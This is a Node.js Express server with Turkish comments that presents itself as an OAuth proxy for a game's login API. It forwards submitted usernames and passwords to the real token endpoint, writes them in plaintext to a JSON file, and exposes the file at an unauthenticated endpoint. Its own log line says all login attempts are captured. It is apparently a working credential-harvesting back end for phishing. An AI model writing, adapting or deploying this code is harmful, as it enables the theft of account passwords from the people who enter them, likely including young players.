const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs').promises;
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3001;
const DATA_FILE = path.join(__dirname, 'login-attempts.json');

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Static files
app.use(express.static(path.join(__dirname, '../dist')));

// Veri dosyasını oluştur
async function initDataFile() {
  try {
    await fs.access(DATA_FILE);
  } catch {
    await fs.writeFile(DATA_FILE, JSON.stringify([]));
  }
}

// Login denemelerini oku
async function readLoginAttempts() {
  try {
    const data = await fs.readFile(DATA_FILE, 'utf8');
    return JSON.parse(data);
  } catch {
    return [];
  }
}

// Login denemelerini kaydet
async function saveLoginAttempt(username, password, success = false) {
  const attempts = await readLoginAttempts();
  const newAttempt = {
    id: crypto.randomUUID(),
    username,
    password,
    timestamp: new Date().toISOString(),
    success
  };
  
  attempts.unshift(newAttempt);
  
  // Son 100 denemeyi tut
  if (attempts.length > 100) {
    attempts.splice(100);
  }
  
  await fs.writeFile(DATA_FILE, JSON.stringify(attempts, null, 2));
  return newAttempt;
}

// OAuth token proxy endpoint
app.post('/api/oauth/token', async (req, res) => {
  const { username, password } = req.body;
  
  console.log('🔐 Login attempt captured:', {
    username: username || 'N/A',
    password: password ? '****' : 'N/A',
    timestamp: new Date().toISOString()
  });
  
  let success = false;
  let responseData = null;
  
  try {
    // Gerçek API'ye forward et
    const fetch = await import('node-fetch').then(module => module.default);
    
    const formData = new URLSearchParams({
      client_id: 'unity.client',
      client_secret: 'secret',
      grant_type: 'password',
      scope: 'openid nebula offline_access',
      username: username || '',
      password: password || '',
      acr_values: 'gameId:j68d'
    });
    
    const response = await fetch('https://eu-secure.mspapis.com/loginidentity/connect/token', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      body: formData
    });
    
    responseData = await response.json();
    success = response.ok && responseData.access_token;
    
    console.log('✅ API Response:', response.ok ? 'Success' : 'Failed');
    
  } catch (error) {
    console.error('❌ API Error:', error.message);
    responseData = { error: 'connection_error', error_description: 'Failed to connect to authentication server' };
  }
  
  // Kullanıcı bilgilerini kaydet
  if (username && password) {
    await saveLoginAttempt(username, password, success);
  }
  
  // Response'u döndür
  res.json(responseData);
});

// Test bağlantısı endpoint'i
app.post('/api/test-connection', async (req, res) => {
  const { username, password } = req.body;
  
  try {
    await saveLoginAttempt(username, password, true);
    res.json({ success: true, message: 'Test connection successful' });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Login denemelerini getir
app.get('/api/login-attempts', async (req, res) => {
  try {
    const attempts = await readLoginAttempts();
    res.json(attempts);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Frontend için catch-all route
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, '../dist/index.html'));
});

// Sunucuyu başlat
async function startServer() {
  await initDataFile();
  
  app.listen(PORT, () => {
    console.log(`🚀 OAuth Proxy Server running on port ${PORT}`);
    console.log(`📊 Dashboard: http://localhost:${PORT}`);
    console.log(`🔗 Proxy endpoint: http://localhost:${PORT}/api/oauth/token`);
    console.log('');
    console.log('📝 Usage:');
    console.log('POST /api/oauth/token with username & password in body');
    console.log('All login attempts will be captured and logged');
  });
}

startServer().catch(console.error);
